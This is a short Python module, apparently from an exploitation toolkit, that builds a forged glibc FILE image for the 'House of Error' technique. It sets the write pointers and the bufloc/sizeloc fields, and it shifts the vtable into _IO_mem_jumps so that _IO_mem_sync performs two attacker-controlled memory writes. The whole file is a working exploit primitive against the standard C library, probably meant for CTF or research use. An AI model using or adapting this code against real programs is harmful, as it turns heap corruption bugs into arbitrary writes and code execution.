"""House of Error _IO_mem_sync field plan."""

from __future__ import annotations

from dataclasses import dataclass


UINT64_LIMIT = 1 << 64
FILE_WRITE_BASE = 0x20
FILE_WRITE_PTR = 0x28
FILE_WRITE_END = 0x30
FILE_VTABLE = 0xD8
FILE_BUFLOC = 0xF0
FILE_SIZELOC = 0xF8
FILE_IMAGE_SIZE = 0x100
VTABLE_SHIFT = 0x38  # sync(0x60) - uflow(0x28)


@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str


def _check_uint64(name: str, value: int) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= UINT64_LIMIT:
        raise ValueError(f"{name} must fit uint64")


def _pack64(value: int) -> bytes:
    _check_uint64("value", value)
    return value.to_bytes(8, "little")


def build_house_of_error(
    *,
    file_addr: int,
    mem_jumps_addr: int,
    bufloc_addr: int,
    sizeloc_addr: int,
    write_base_addr: int,
    write_length: int,
) -> tuple[MemoryWrite, ...]:
    """生成 `_IO_mem_sync` 双写消费点。

    file_addr: 真实/伪造 FILE 地址；
    mem_jumps_addr: `_IO_mem_jumps` 地址。
    bufloc_addr/sizeloc_addr: 两个被写入的目标地址。
    write_base_addr: `_IO_write_base`，第一次写入的值。
    write_length: `_IO_write_ptr - _IO_write_base`，第二次写入的 size 值。
    """

    for name, value in {
        "file_addr": file_addr,
        "mem_jumps_addr": mem_jumps_addr,
        "bufloc_addr": bufloc_addr,
        "sizeloc_addr": sizeloc_addr,
        "write_base_addr": write_base_addr,
    }.items():
        _check_uint64(name, value)

    if write_length <= 0 or write_length >= UINT64_LIMIT:
        raise ValueError("write_length must be positive")

    write_end = write_base_addr + write_length
    _check_uint64("write_end", write_end)

    image = bytearray(FILE_IMAGE_SIZE)
    image[FILE_WRITE_BASE:FILE_WRITE_BASE + 8] = _pack64(write_base_addr)
    image[FILE_WRITE_PTR:FILE_WRITE_PTR + 8] = _pack64(write_end)
    image[FILE_WRITE_END:FILE_WRITE_END + 8] = _pack64(write_end + 1)
    image[FILE_VTABLE:FILE_VTABLE + 8] = _pack64(mem_jumps_addr + VTABLE_SHIFT)
    image[FILE_BUFLOC:FILE_BUFLOC + 8] = _pack64(bufloc_addr)
    image[FILE_SIZELOC:FILE_SIZELOC + 8] = _pack64(sizeloc_addr)

    return (
        MemoryWrite(file_addr, bytes(image), "memstream FILE + mem_sync vtable"),
    )
